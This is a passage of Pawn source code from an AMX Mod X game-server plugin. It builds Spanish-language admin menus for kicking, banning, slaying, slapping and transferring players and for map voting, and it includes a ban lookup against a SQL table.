	iItemId = sPosition[0];
	g_MenuData_ServerId[id] = iItemId;

	showMenu__ServerIn(id);
	return PLUGIN_HANDLED;
}

public showMenu__ServerIn(const id) {
	if(!get_pcvar_num(g_pCvar_Servers)) {
		return;
	}

	new iServerId = g_MenuData_ServerId[id];

	if(!(0 <= iServerId <= (structIdServers - 1)) || iServerId == SV_NONE || g_ServerMaxPlayers[iServerId] < 2) {
		showMenu__Servers(id);
		return;
	}

	new sTitle[32];
	formatex(sTitle, charsmax(sTitle), "%s", __SERVERS[iServerId][serverName]);
	strtoupper(sTitle);

	oldmenu_create("\y%s^n\wAgrega la IP a favoritos si desea entrar", "menu__ServerIn", sTitle);

	oldmenu_additem(-1, -1, "\yHOSTNAME\r:");
	oldmenu_additem(-1, -1, "\r - \w%s^n", g_ServerName[iServerId]);

	oldmenu_additem(-1, -1, "\yIP DEL SERVIDOR\r:");
	oldmenu_additem(-1, -1, "\r - \w%s:%s^n", __SERVERS[iServerId][serverIp], __SERVERS[iServerId][serverPort]);

	oldmenu_additem(-1, -1, "\yJUGADORES CONECTADOS\r:");
	oldmenu_additem(-1, -1, "\r - \w%d / %d^n", g_ServerPlayers[iServerId], g_ServerMaxPlayers[iServerId]);

	oldmenu_additem(-1, -1, "\yMAPA ACTUAL\r:");
	oldmenu_additem(-1, -1, "\r - \w%s^n", g_ServerCurrentMap[iServerId]);

	oldmenu_additem(0, 0, "\r0.\w Volver");
	oldmenu_display(id);
}

public menu__ServerIn(const id, const item) {
	if(!get_pcvar_num(g_pCvar_Servers)) {
		return;
	}

	new iServerId = g_MenuData_ServerId[id];

	if(!item || !(0 <= iServerId <= (structIdServers - 1)) || iServerId == SV_NONE || g_ServerMaxPlayers[iServerId] < 2) {
		showMenu__Servers(id);
		return;
	}

	showMenu__ServerIn(id);
}

public showMenu__AmxModMenu(const id) {
	if(!(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return;
	}

	oldmenu_create("\yAMX MOD MENU", "menu__AmxModMenu");

	oldmenu_additem(1, 1, "\r1.\w Expulsar usuario");
	oldmenu_additem(2, 2, "\r2.\w Banear usuario");
	oldmenu_additem(3, 3, "\r3.\w Asesinar usuario");
	oldmenu_additem(4, 4, "\r4.\w Golpear usuario^n");

	oldmenu_additem(5, 5, "\r5.\w Transferir usuario");
	oldmenu_additem(6, 6, "\r6.\w Amordazar usuario");
	oldmenu_additem(7, 7, "\r7.\w Desamordazar usuario^n");

	oldmenu_additem(8, 8, "\r8.\w Lista de Mapas");
	oldmenu_additem(9, 9, "\r9.\w Votación de Mapas^n");

	oldmenu_additem(0, 0, "\r0.\w Salir");
	oldmenu_display(id);
}

public menu__AmxModMenu(const id, const item) {
	if(!item || !(get_user_flags(id) & ADMIN_IMMUNITY)) {
		return;
	}

	switch(item) {
		case 1: {
			showMenu__Kick(id);
		} case 2: {
			showMenu__Ban(id);
		} case 3: {
			showMenu__Slay(id);
		} case 4: {
			if(g_ServerId == SV_DR) {
				clientPrintColor(id, _, "Este comando está deshabilitado en este servidor.");
				return;
			}

			showMenu__Slap(id);
		} case 5: {
			if(g_ServerId == SV_ZR || g_ServerId == SV_TTT || g_ServerId == SV_ZP) {
				clientPrintColor(id, _, "Este comando está deshabilitado en este servidor.");
				return;
			}

			showMenu__Team(id);
		} case 6: {
			showMenu__Gag(id);
		} case 7: {
			showMenu__UnGag(id);
		} case 8: {
			showMenu__MapMenu(id);
		} case 9: {
			showMenu__VoteMapMenu(id);
		}
	}
}

public showMenu__Kick(const id) {
	new iMenuId;
	new i;
	new sItem[64];
	new sPosition[2];

	iMenuId = menu_create("EXPULSAR USUARIO\R", "menu__Kick");

	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_connected(i)) {
			continue;
		}

		formatex(sItem, charsmax(sItem), "%s%s", g_PlayerName[i], (((get_user_flags(i) & ADMIN_IMMUNITY)) ? " \r*" : ""));

		sPosition[0] = i;
		sPosition[1] = 0;

		menu_additem(iMenuId, sItem, sPosition);
	}

	if(menu_items(iMenuId) <= 0) {
		clientPrintColor(id, _, "No hay jugadores disponibles para mostrar en el menú.");

		DestroyLocalMenu(id, iMenuId);
		return;
	}

	menu_setprop(iMenuId, MPROP_BACKNAME, "Atrás");
	menu_setprop(iMenuId, MPROP_NEXTNAME, "Siguiente");
	menu_setprop(iMenuId, MPROP_EXITNAME, "Salir");

	g_MenuPage_Users[id] = min(g_MenuPage_Users[id], (menu_pages(iMenuId) - 1));

	fix_pdata_menu(id);
	ShowLocalMenu(id, iMenuId, 0);
}

public menu__Kick(const id, const menu, const item) {
	if(!is_user_connected(id)) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new iItemId;
	player_menu_info(id, iItemId, iItemId, g_MenuPage_Users[id]);

	if(item == MENU_EXIT) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new sPosition[2];
	menu_item_getinfo(menu, item, iItemId, sPosition, charsmax(sPosition), _, _, iItemId);
	DestroyLocalMenu(id, menu);

	iItemId = sPosition[0];

	if(is_user_connected(iItemId)) {
		client_cmd(id, "amx_kick #%d", get_user_userid(iItemId));
	} else {
		clientPrintColor(id, _, "El jugador seleccionado se ha desconectado.");
	}

	set_task(0.1, "showMenu__Kick", id);
	return PLUGIN_HANDLED;
}

public showMenu__Ban(const id) {
	new iMenuId;
	new i;
	new sItem[64];
	new sPosition[2];

	iMenuId = menu_create("BANEAR USUARIO\R", "menu__Ban");

	if((get_user_flags(id) & ADMIN_LEVEL_D)) {
		menu_additem(iMenuId, "Banear desconectados^n", "0");
	}

	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_connected(i)) {
			continue;
		}

		formatex(sItem, charsmax(sItem), "%s%s", g_PlayerName[i], (((get_user_flags(i) & ADMIN_IMMUNITY)) ? " \r*" : ""));

		sPosition[0] = i;
		sPosition[1] = 0;

		menu_additem(iMenuId, sItem, sPosition);
	}

	if(menu_items(iMenuId) <= 0) {
		clientPrintColor(id, _, "No hay jugadores disponibles para mostrar en el menú.");

		DestroyLocalMenu(id, iMenuId);
		return;
	}

	menu_setprop(iMenuId, MPROP_BACKNAME, "Atrás");
	menu_setprop(iMenuId, MPROP_NEXTNAME, "Siguiente");
	menu_setprop(iMenuId, MPROP_EXITNAME, "Salir");

	g_MenuPage_Users[id] = min(g_MenuPage_Users[id], (menu_pages(iMenuId) - 1));

	fix_pdata_menu(id);
	ShowLocalMenu(id, iMenuId, 0);
}

public menu__Ban(const id, const menu, const item) {
	if(!is_user_connected(id)) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new iItemId;
	player_menu_info(id, iItemId, iItemId, g_MenuPage_Users[id]);

	if(item == MENU_EXIT) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new sPosition[2];
	menu_item_getinfo(menu, item, iItemId, sPosition, charsmax(sPosition), _, _, iItemId);
	DestroyLocalMenu(id, menu);

	if(sPosition[0] == '0' && (get_user_flags(id) & ADMIN_LEVEL_D)) {
		showMenu__BanDisconnect(id);
		return PLUGIN_HANDLED;
	}

	iItemId = sPosition[0];
	g_MenuData_UserId[id] = iItemId;

	showMenu__BanInfo(id);
	return PLUGIN_HANDLED;
}

public showMenu__BanDisconnect(const id) {
	if(!(get_user_flags(id) & ADMIN_LEVEL_D)) {
		return;
	}

	new iMenuId;
	new i;
	new iLastTime;
	new sItem[64];
	new sPosition[2];

	iMenuId = menu_create("BANEAR DESCONECTADOS\R", "menu__BanDisconnect");

	for(i = 0; i <= g_LastPlayers_Count; ++i) {
		if(!g_LastPlayers_Name[i][0]) {
			continue;
		}

		iLastTime = ((get_arg_systime() - g_LastPlayers_LastTime[i]) / 60);

		if(iLastTime) {
			formatex(sItem, charsmax(sItem), "%s \d(hace %d min%s)", g_LastPlayers_Name[i], iLastTime, ((iLastTime != 1) ? "s" : ""));
		} else {
			formatex(sItem, charsmax(sItem), "%s \d(recientemente)", g_LastPlayers_Name[i]);
		}

		sPosition[0] = i;
		sPosition[1] = 0;

		menu_additem(iMenuId, sItem, sPosition);
	}

	if(menu_items(iMenuId) <= 0) {
		clientPrintColor(id, _, "No hay jugadores disponibles para mostrar en el menú.");

		DestroyLocalMenu(id, iMenuId);
		return;
	}

	menu_setprop(iMenuId, MPROP_BACKNAME, "Atrás");
	menu_setprop(iMenuId, MPROP_NEXTNAME, "Siguiente");
	menu_setprop(iMenuId, MPROP_EXITNAME, "Salir");

	g_MenuPage_BanDisconnect[id] = min(g_MenuPage_BanDisconnect[id], (menu_pages(iMenuId) - 1));

	fix_pdata_menu(id);
	ShowLocalMenu(id, iMenuId, 0);
}

public menu__BanDisconnect(const id, const menu, const item) {
	if(!is_user_connected(id) || !(get_user_flags(id) & ADMIN_LEVEL_D)) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new iItemId;
	player_menu_info(id, iItemId, iItemId, g_MenuPage_BanDisconnect[id]);

	if(item == MENU_EXIT) {
		DestroyLocalMenu(id, menu);

		showMenu__Ban(id);
		return PLUGIN_HANDLED;
	}

	new sPosition[2];
	menu_item_getinfo(menu, item, iItemId, sPosition, charsmax(sPosition), _, _, iItemId);
	DestroyLocalMenu(id, menu);

	iItemId = sPosition[0];
	g_MenuData_BanDisconnectId[id] = iItemId;

	showMenu__BanDisconnectInfo(id);
	return PLUGIN_HANDLED;
}

public showMenu__BanDisconnectInfo(const id) {
	new iDisconnectId = g_MenuData_BanDisconnectId[id];

	if(!g_LastPlayers_Name[iDisconnectId][0]) {
		showMenu__BanDisconnect(id);
		return;
	}

	new iLastTime = ((get_arg_systime() - g_LastPlayers_LastTime[iDisconnectId]) / 60);
	new sTitle[64];

	if(iLastTime) {
		formatex(sTitle, charsmax(sTitle), "\yBANEAR A\r:\w %s^n\wDesconectado hace \y%d min%s\w", g_LastPlayers_Name[iDisconnectId], iLastTime, ((iLastTime != 1) ? "s" : ""));
	} else {
		formatex(sTitle, charsmax(sTitle), "\yBANEAR A\r:\w %s^n\wDesconectado recientemente", g_LastPlayers_Name[iDisconnectId]);
	}

	oldmenu_create(sTitle, "menu__BanDisconnectInfo");

	oldmenu_additem(-1, -1, "\yIP o STEAMID\r:");

	if((get_user_flags(id) & ADMIN_LEVEL_E)) {
		oldmenu_additem(-1, -1, "\r - \wIP\r:\y %s", g_LastPlayers_Ip[iDisconnectId]);
	} else {
		oldmenu_additem(-1, -1, "\r - \wIP\r:\y (privada)");
	}

	if(getUserIsSteamId(g_LastPlayers_SteamId[iDisconnectId])) {
		oldmenu_additem(-1, -1, "\r - \wSteamId\r:\y %s", g_LastPlayers_SteamId[iDisconnectId]);
	}

	oldmenu_additem(-1, -1, "^n\yTIEMPO DE BAN\r:\w %d", g_MenuData_BanDisconnectTime[id]);

	if(g_MenuData_BanDisconnectReason[id][0]) {
		oldmenu_additem(-1, -1, "\yRAZÓN\r:\w %s^n", g_MenuData_BanDisconnectReason[id]);
	} else {
		oldmenu_additem(-1, -1, "\yRAZÓN\r:\w no-especificado^n");
	}

	oldmenu_additem(1, 1, "\r1.\w Aplicar tiempo \d(en minutos)");
	oldmenu_additem(2, 2, "\r2.\w Aplicar razón \d(OBLIGATORIO)^n");

	if((0 <= g_MenuData_BanDisconnectTime[id] <= MAX_BAN_TIME) && g_MenuData_BanDisconnectReason[id][0]) {
		oldmenu_additem(9, 9, "\r9.\w Aplicar ban");
	} else {
		oldmenu_additem(-1, -1, "\d9. Aplicar ban");
	}

	oldmenu_additem(0, 0, "\r0.\w Volver");
	oldmenu_display(id);
}

public menu__BanDisconnectInfo(const id, const item) {
	if(!item) {
		showMenu__BanDisconnect(id);
	} else {
		new iDisconnectId = g_MenuData_BanDisconnectId[id];

		if(!g_LastPlayers_Name[iDisconnectId][0]) {
			showMenu__BanDisconnect(id);
			return;
		}

		if(item == 1) {
			g_MenuData_BanDisconnect[id] = 1;

			client_cmd(id, "messagemode BAN_TIME");
			clientPrintColor(id, _, "Ingresa el tiempo de ban, tiene que ser en minutos. Para que sea permanente, ingresa el número 0.");
		} else if(item == 2) {
			g_MenuData_BanDisconnect[id] = 1;

			client_cmd(id, "messagemode BAN_REASON");
			clientPrintColor(id, _, "Ingresa la razón del ban (es de rasgo OBLIGATORIO).");
		} else if(item == 9 && (0 <= g_MenuData_BanDisconnectTime[id] <= MAX_BAN_TIME) && g_MenuData_BanDisconnectReason[id][0]) {
			new sAuthId[64];

			if(getUserIsSteamId(g_LastPlayers_SteamId[iDisconnectId])) {
				copy(sAuthId, charsmax(sAuthId), g_LastPlayers_SteamId[iDisconnectId]);
			} else {
				copy(sAuthId, charsmax(sAuthId), g_LastPlayers_Ip[iDisconnectId]);
			}

			new Handle:sqlQuery = SQL_PrepareQuery(g_SqlConnection, "SELECT * FROM `gral_bans` WHERE (`user_authid`=^"%s^" AND `active`='1');", sAuthId);

			if(!SQL_Execute(sqlQuery)) {
				executeQuery(id, sqlQuery, 7);
			} else if(SQL_NumResults(sqlQuery)) {
				SQL_FreeHandle(sqlQuery);

				clientPrintColor(id, _, "El jugador ya está baneado. Busca en el Panel de Administración dentro del foro web para más información (!g%s!y).", __PLUGIN_COMMUNITY_FORUM);
				showMenu__BanDisconnect(id);
			} else {
				SQL_FreeHandle(sqlQuery);

				new iSysTime = get_arg_systime();
				new iFinish;

				if(g_MenuData_BanDisconnectTime[id] != 0) {
					iFinish = ((g_MenuData_BanDisconnectTime[id] * 60) + iSysTime);
				} else {
					iFinish = 2000000000;
				}

				addBan(id, g_PlayerName[id], g_PlayerSteamId[id], g_LastPlayers_Name[iDisconnectId], sAuthId, iSysTime, g_MenuData_BanDisconnectTime[id], iFinish, g_MenuData_BanDisconnectReason[id]);
				showBanInfo(id, g_PlayerName[id], g_PlayerSteamId[id], g_LastPlayers_Name[iDisconnectId], sAuthId, iSysTime, g_MenuData_BanDisconnectTime[id], iFinish, g_MenuData_BanDisconnectReason[id], 0, 0);

				new sTimeBan[32];
				getUserTimeBan(g_MenuData_BanDisconnectTime[id], sTimeBan, charsmax(sTimeBan));

				clientPrintColor(0, _, "!t%s!y ha baneado a !t%s!y (desconectado) - Tiempo [!g%s!y] - Razón [!g%s!y].", g_PlayerName[id], g_LastPlayers_Name[iDisconnectId], sTimeBan, g_MenuData_BanDisconnectReason[id]);
				log_amx("<%s><%s> ha baneado a <%s><%s> (desconectado) - Tiempo <%s> - Razón <%s>", g_PlayerName[id], g_PlayerSteamId[id], g_LastPlayers_Name[iDisconnectId], sAuthId, sTimeBan, g_MenuData_BanDisconnectReason[id]);
			}
		}
	}
}

public showMenu__BanInfo(const id) {
	new iUserId = g_MenuData_UserId[id];

	if(!is_user_connected(iUserId)) {
		showMenu__Ban(id);
		return;
	}

	oldmenu_create("\yBANEAR A\r:\w %s", "menu__BanInfo", g_PlayerName[iUserId]);

	oldmenu_additem(-1, -1, "\yTIEMPO DE BAN\r:\w %d", g_MenuData_BanTime[id]);

	if(g_MenuData_BanReason[id][0]) {
		oldmenu_additem(-1, -1, "\yRAZÓN\r:\w %s^n", g_MenuData_BanReason[id]);
	} else {
		oldmenu_additem(-1, -1, "\yRAZÓN\r:\w no-especificado^n");
	}

	oldmenu_additem(1, 1, "\r1.\w Aplicar tiempo \d(en minutos)");
	oldmenu_additem(2, 2, "\r2.\w Aplicar razón \d(OBLIGATORIO)^n");

	if(g_MenuData_BanTime[id] && g_MenuData_BanReason[id][0]) {
		oldmenu_additem(9, 9, "\r9.\w Aplicar ban");
	} else {
		oldmenu_additem(-1, -1, "\d9. Aplicar ban");
	}

	oldmenu_additem(0, 0, "\r0.\w Volver");
	oldmenu_display(id);
}

public menu__BanInfo(const id, const item) {
	if(!item) {
		showMenu__Ban(id);
	} else {
		new iUserId = g_MenuData_UserId[id];

		if(!is_user_connected(iUserId)) {
			showMenu__Ban(id);
			return;
		}

		if(item == 1) {
			g_MenuData_BanDisconnect[id] = 0;

			client_cmd(id, "messagemode BAN_TIME");
			clientPrintColor(id, _, "Ingresa el tiempo de ban, tiene que ser en minutos. Para que sea permanente, ingresa el número 0.");
		} else if(item == 2) {
			g_MenuData_BanDisconnect[id] = 0;

			client_cmd(id, "messagemode BAN_REASON");
			clientPrintColor(id, _, "Ingresa la razón del ban (es de rasgo OBLIGATORIO).");
		} else if(item == 9 && g_MenuData_BanTime[id] && g_MenuData_BanReason[id][0]) {
			client_cmd(id, "amx_ban #%d %d ^"%s^"", get_user_userid(iUserId), g_MenuData_BanTime[id], g_MenuData_BanReason[id]);
		}
	}
}

public showMenu__Slay(const id) {
	new iMenuId;
	new i;
	new sItem[64];
	new sPosition[2];

	iMenuId = menu_create("ASESINAR USUARIO\R", "menu__Slay");

	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_alive(i)) {
			continue;
		}

		formatex(sItem, charsmax(sItem), "%s%s", g_PlayerName[i], (((get_user_flags(i) & ADMIN_IMMUNITY)) ? " \r*" : ""));

		sPosition[0] = i;
		sPosition[1] = 0;

		menu_additem(iMenuId, sItem, sPosition);
	}

	if(menu_items(iMenuId) <= 0) {
		clientPrintColor(id, _, "No hay jugadores disponibles para mostrar en el menú.");

		DestroyLocalMenu(id, iMenuId);
		return;
	}

	menu_setprop(iMenuId, MPROP_BACKNAME, "Atrás");
	menu_setprop(iMenuId, MPROP_NEXTNAME, "Siguiente");
	menu_setprop(iMenuId, MPROP_EXITNAME, "Salir");

	g_MenuPage_Users[id] = min(g_MenuPage_Users[id], (menu_pages(iMenuId) - 1));

	fix_pdata_menu(id);
	ShowLocalMenu(id, iMenuId, 0);
}

public menu__Slay(const id, const menu, const item) {
	if(!is_user_connected(id)) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new iItemId;
	player_menu_info(id, iItemId, iItemId, g_MenuPage_Users[id]);

	if(item == MENU_EXIT) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new sPosition[2];
	menu_item_getinfo(menu, item, iItemId, sPosition, charsmax(sPosition), _, _, iItemId);
	DestroyLocalMenu(id, menu);

	iItemId = sPosition[0];

	if(is_user_connected(iItemId)) {
		if(is_user_alive(iItemId)) {
			client_cmd(id, "amx_slay #%d", get_user_userid(iItemId));
		} else {
			clientPrintColor(id, _, "El jugador seleccionado está muerto.");
		}
	} else {
		clientPrintColor(id, _, "El jugador seleccionado se ha desconectado.");
	}

	set_task(0.1, "showMenu__Slay", id);
	return PLUGIN_HANDLED;
}

public showMenu__Slap(const id) {
	if(g_ServerId == SV_DR) {
		clientPrintColor(id, _, "Este comando está deshabilitado en este servidor.");
		return;
	}

	new iMenuId;
	new i;
	new sItem[64];
	new sPosition[2];

	iMenuId = menu_create("GOLPEAR USUARIO\R", "menu__Slap");

	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_alive(i)) {
			continue;
		}

		formatex(sItem, charsmax(sItem), "%s%s", g_PlayerName[i], (((get_user_flags(i) & ADMIN_IMMUNITY)) ? " \r*" : ""));

		sPosition[0] = i;
		sPosition[1] = 0;

		menu_additem(iMenuId, sItem, sPosition);
	}

	if(!menu_items(iMenuId)) {
		clientPrintColor(id, _, "No hay jugadores disponibles para mostrar en el menú.");

		DestroyLocalMenu(id, iMenuId);
		return;
	}

	menu_setprop(iMenuId, MPROP_BACKNAME, "Atrás");
	menu_setprop(iMenuId, MPROP_NEXTNAME, "Siguiente");
	menu_setprop(iMenuId, MPROP_EXITNAME, "Salir");

	g_MenuPage_Users[id] = min(g_MenuPage_Users[id], (menu_pages(iMenuId) - 1));

	fix_pdata_menu(id);
	ShowLocalMenu(id, iMenuId, 0);
}

public menu__Slap(const id, const menu, const item) {
	if(g_ServerId == SV_DR || !is_user_connected(id)) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new iItemId;
	player_menu_info(id, iItemId, iItemId, g_MenuPage_Users[id]);

	if(item == MENU_EXIT) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new sPosition[2];
	menu_item_getinfo(menu, item, iItemId, sPosition, charsmax(sPosition), _, _, iItemId);
	DestroyLocalMenu(id, menu);

	iItemId = sPosition[0];

	if(is_user_connected(iItemId)) {
		if(is_user_alive(iItemId)) {
			client_cmd(id, "amx_slap #%d 0 0", get_user_userid(iItemId));
		} else {
			clientPrintColor(id, _, "El jugador seleccionado está muerto.");
		}
	} else {
		clientPrintColor(id, _, "El jugador seleccionado se ha desconectado.");
	}

	set_task(0.1, "showMenu__Slap", id);
	return PLUGIN_HANDLED;
}

public showMenu__Team(const id) {
	if(g_ServerId == SV_ZR || g_ServerId == SV_TTT || g_ServerId == SV_ZP) {
		clientPrintColor(id, _, "Este comando está deshabilitado en este servidor.");
		return;
	}

	new iMenuId;
	new i;
	new sItem[64];
	new sPosition[2];
	new TeamName:iTeam;

	iMenuId = menu_create("TRANSFERIR USUARIO\R", "menu__Team");

	if(g_MenuData_TeamId[id] == TEAM_UNASSIGNED) {
		g_MenuData_TeamId[id] = TEAM_TERRORIST;
	}

	formatex(sItem, charsmax(sItem), "TRANSFERIR A \y[%s]^n", __TEAM_NAMES[g_MenuData_TeamId[id]]);
	menu_additem(iMenuId, sItem, "0");

	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_connected(i)) {
			continue;
		}

		iTeam = getUserTeam(i);

		if(iTeam == g_MenuData_TeamId[id]) {
			continue;
		}

		formatex(sItem, charsmax(sItem), "%s%s", g_PlayerName[i], (((get_user_flags(i) & ADMIN_IMMUNITY)) ? " \r*" : ""));

		sPosition[0] = i;
		sPosition[1] = 0;

		menu_additem(iMenuId, sItem, sPosition);
	}

	if(menu_items(iMenuId) <= 0) {
		clientPrintColor(id, _, "No hay jugadores disponibles para transferir al equipo !g%s!y.", __TEAM_NAMES[g_MenuData_TeamId[id]]);
		DestroyLocalMenu(id, iMenuId);

		++g_MenuData_TeamId[id];

		if(g_MenuData_TeamId[id] > TEAM_SPECTATOR) {
			g_MenuData_TeamId[id] = TEAM_TERRORIST;
		}

		showMenu__Team(id);
		return;
	}

	menu_setprop(iMenuId, MPROP_BACKNAME, "Atrás");
	menu_setprop(iMenuId, MPROP_NEXTNAME, "Siguiente");
	menu_setprop(iMenuId, MPROP_EXITNAME, "Salir");

	g_MenuPage_Users[id] = min(g_MenuPage_Users[id], (menu_pages(iMenuId) - 1));

	fix_pdata_menu(id);
	ShowLocalMenu(id, iMenuId, 0);
}

public menu__Team(const id, const menu, const item) {
	if(g_ServerId == SV_ZR || g_ServerId == SV_TTT || g_ServerId == SV_ZP || !is_user_connected(id)) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new iItemId;
	player_menu_info(id, iItemId, iItemId, g_MenuPage_Users[id]);

	if(item == MENU_EXIT) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new sPosition[2];
	menu_item_getinfo(menu, item, iItemId, sPosition, charsmax(sPosition), _, _, iItemId);
	DestroyLocalMenu(id, menu);

	if(sPosition[0] == '0') {
		++g_MenuData_TeamId[id];

		if(g_MenuData_TeamId[id] > TEAM_SPECTATOR) {
			g_MenuData_TeamId[id] = TEAM_TERRORIST;
		}

		showMenu__Team(id);
		return PLUGIN_HANDLED;
	}

	iItemId = sPosition[0];

	if(is_user_connected(iItemId)) {
		setUserTeam(iItemId, g_MenuData_TeamId[id]);

		if(is_user_alive(iItemId)) {
			user_kill(iItemId, 1);
		}

		clientPrintColor(0, iItemId, "!t%s!y transfirió a !t%s!y al equipo !g%s!y.", g_PlayerName[id], g_PlayerName[iItemId], __TEAM_NAMES[g_MenuData_TeamId[id]]);
	} else {
		clientPrintColor(id, _, "El jugador seleccionado se ha desconectado.");
	}

	set_task(0.1, "showMenu__Team", id);
	return PLUGIN_HANDLED;
}

public showMenu__MapMenu(const id) {
	new iMenuId;
	new i;
	new sItem[64];
	new sPosition[2];

	iMenuId = menu_create("LISTA DE MAPAS\R", "menu__MapMenu");

	for(i = 0; i < g_VoteMap_AllMaps; ++i) {
		formatex(sItem, charsmax(sItem), "%a", ArrayGetStringHandle(g_aMapName, i));
		strtolower(sItem);

		sPosition[0] = i;
		sPosition[1] = 0;

		menu_additem(iMenuId, sItem, sPosition);
	}

	menu_setprop(iMenuId, MPROP_BACKNAME, "Atrás");
	menu_setprop(iMenuId, MPROP_NEXTNAME, "Siguiente");
	menu_setprop(iMenuId, MPROP_EXITNAME, "Salir");

	g_MenuPage_Maps[id] = min(g_MenuPage_Maps[id], (menu_pages(iMenuId) - 1));

	fix_pdata_menu(id);
	ShowLocalMenu(id, iMenuId, 0);
}

public menu__MapMenu(const id, const menu, const item) {
	if(!is_user_connected(id)) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new iItemId;
	player_menu_info(id, iItemId, iItemId, g_MenuPage_Maps[id]);

	if(item == MENU_EXIT) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new sPosition[2];
	new sMap[MAX_CHARACTER_MAPNAME];

	menu_item_getinfo(menu, item, iItemId, sPosition, charsmax(sPosition), sMap, charsmax(sMap), iItemId);
	DestroyLocalMenu(id, menu);

	if(equali(g_CurrentMap, sMap) || equali(g_LastMap, sMap)) {
		clientPrintColor(id, _, "No puedes cambiar al mismo o al último mapa jugado.");

		showMenu__MapMenu(id);
		return PLUGIN_HANDLED;
	}

	iItemId = sPosition[0];

	client_cmd(id, "amx_map ^"%a^"", ArrayGetStringHandle(g_aMapName, iItemId));
	return PLUGIN_HANDLED;
}

public showMenu__VoteMapMenu(const id) {
	oldmenu_create("\yVOTACIÓN DE MAPAS", "menu__VoteMapMenu");

	oldmenu_additem(1, 1, "\r1.\w Elegir mapas");
	oldmenu_additem(2, 2, "\r2.\w Ver mapas elegidos^n");

	oldmenu_additem(9, 9, "\r9.\w Comenzar la votación");
	oldmenu_additem(0, 0, "\r0.\w Salir");

	oldmenu_display(id);
}

public menu__VoteMapMenu(const id, const item) {
	if(!item) {
		return;
	}

	switch(item) {
		case 1: {
			showMenu__VoteMapMenuChoose(id);
		} case 2: {
			showMenu__VoteMapMenuView(id);
		} case 9: {
			if(g_Vote_Init) {
				clientPrintColor(id, _, "No puedes lanzar la votación porque ya hay una en curso.");

				showMenu__VoteMapMenu(id);
				return;
			}

			static sCommand[256];
			new iLen = formatex(sCommand, charsmax(sCommand), "amx_votemap ");
			new i;
			new j = 0;

			for(i = 0; i < MAX_VOTES; ++i) {
				if(g_VoteMapChoose_Id[id][i] >= 0) {
					iLen += formatex(sCommand[iLen], charsmax(sCommand) - iLen, "^"%a^" ", ArrayGetStringHandle(g_aMapName, g_VoteMapChoose_Id[id][i]));
					++j;
				}
			}

			if(j < 2) {
				clientPrintColor(id, _, "Tiene que haber dos o más mapas para comenzar la votación.");

				showMenu__VoteMapMenu(id);
				return;
			} else if(j > (MAX_VOTES - 1)) {
				clientPrintColor(id, _, "No pueden haber más de %d mapas para la votación.", (MAX_VOTES - 1));

				showMenu__VoteMapMenu(id);
				return;
			}

			client_cmd(id, sCommand);
		}
	}
}

public showMenu__VoteMapMenuChoose(const id) {
	new iMenuId;
	new i;
	new sItem[64];
	new sPosition[2];

	iMenuId = menu_create("ELEGIR MAPAS^n\wElige entre 2 a 4 mapas para la votación\y\R", "menu__VoteMapMenuChoose");

	for(i = 0; i < g_VoteMap_AllMaps; ++i) {
		formatex(sItem, charsmax(sItem), "%a", ArrayGetStringHandle(g_aMapName, i));
		strtolower(sItem);

		sPosition[0] = i;
		sPosition[1] = 0;

		menu_additem(iMenuId, sItem, sPosition);
	}

	menu_setprop(iMenuId, MPROP_BACKNAME, "Atrás");
	menu_setprop(iMenuId, MPROP_NEXTNAME, "Siguiente");
	menu_setprop(iMenuId, MPROP_EXITNAME, "Salir");

	fix_pdata_menu(id);
	ShowLocalMenu(id, iMenuId);
}

public menu__VoteMapMenuChoose(const id, const menu, const item) {
	if(!is_user_connected(id)) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	if(item == MENU_EXIT) {
		DestroyLocalMenu(id, menu);

		showMenu__VoteMapMenu(id);
		return PLUGIN_HANDLED;
	}
	
	new iItemId;
	new sPosition[2];
	new i;
	
	menu_item_getinfo(menu, item, iItemId, sPosition, charsmax(sPosition), _, _, iItemId);
	DestroyLocalMenu(id, menu);

	iItemId = sPosition[0];

	for(i = 0; i < MAX_VOTES; ++i) {
		if(g_VoteMapChoose_Id[id][i] >= 0) {
			if(i == MAX_VOTES) {
				clientPrintColor(id, _, "Tu lista de mapas está completa.");
				break;
			}

			if(g_VoteMapChoose_Id[id][i] == iItemId) {
				clientPrintColor(id, _, "El mapa seleccionado ya está en tu lista.");
				break;
			}

			continue;
		}

		g_VoteMapChoose_Id[id][i] = iItemId;

		clientPrintColor(id, _, "Se agregó el mapa !g%a!y a tu lista.", ArrayGetStringHandle(g_aMapName, iItemId));
		break;
	}

	showMenu__VoteMapMenuChoose(id);
	return PLUGIN_HANDLED;
}

public showMenu__VoteMapMenuView(const id) {
	new iMenuId;
	new i;
	new sItem[64];
	new sPosition[2];

	iMenuId = menu_create("VER MAPAS ELEGIDO^n\wSelecciona un mapa para borrarlo de la lista\y\R", "menu__VoteMapMenuView");

	for(i = 0; i < MAX_VOTES; ++i) {
		if(g_VoteMapChoose_Id[id][i] >= 0) {
			formatex(sItem, charsmax(sItem), "%a", ArrayGetStringHandle(g_aMapName, g_VoteMapChoose_Id[id][i]));
			strtolower(sItem);

			sPosition[0] = i;
			sPosition[1] = 0;

			menu_additem(iMenuId, sItem, sPosition);
		}
	}

	if(menu_items(iMenuId) < 1) {
		clientPrintColor(id, _, "No hay mapas en tu lista para mostrar en el menú.");

		DestroyLocalMenu(id, iMenuId);

